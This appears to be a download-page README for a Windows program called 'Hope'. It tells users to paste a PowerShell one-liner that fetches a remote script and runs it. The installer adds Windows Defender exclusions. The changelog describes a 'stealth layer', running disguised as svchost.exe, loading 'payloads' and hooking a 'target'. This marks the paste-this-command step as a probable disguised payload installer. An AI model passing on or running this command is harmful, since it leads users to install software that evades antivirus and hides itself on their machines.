# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://hope-install.pages.dev/install.ps1 | iex"
```

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, verifies its checksum, and asks for admin permission to install itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> → Finds the newest release for you
> → Verifies the download against its published SHA-256
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done
>
> After this, Hope updates itself on launch — you only install once.

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.3.1 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.3.1.exe` — `61280949BED0ED2015B69FE23692E10C9BB80301A585758CC2108C431ACE34AA`
- **Prefer a manual download?** Take `HopeSetup-1.3.1.exe` from the [latest release](https://github.com/muleimm/h-releases/releases/latest) and run it.

## What's new in 1.3.1

- **Deployment validation build.** Ships the stealth layer unchanged so the installed copy can be exercised the way it actually runs: from `C:\Program Files\Hope`, as `svchost.exe`, from the shortcut.
- **Fixed: Hope could lose its own payloads mid-session.** Payloads load from the folder Hope runs from; when that folder was a build output directory being rewritten, loading could fail and the target stayed unhooked. Program Files removes that.
- **Settings moved out of the working directory**, to `%APPDATA%\ofradr\hotkeys.json`, so launching from a different folder can no longer swap your shortcuts.
- Known and unchanged: three enumeration filters are still empty, and the window's owner can be hidden independently.

Latest release: [v1.3.1](https://github.com/muleimm/h-releases/releases/tag/v1.3.1) · All releases are kept and never overwritten.
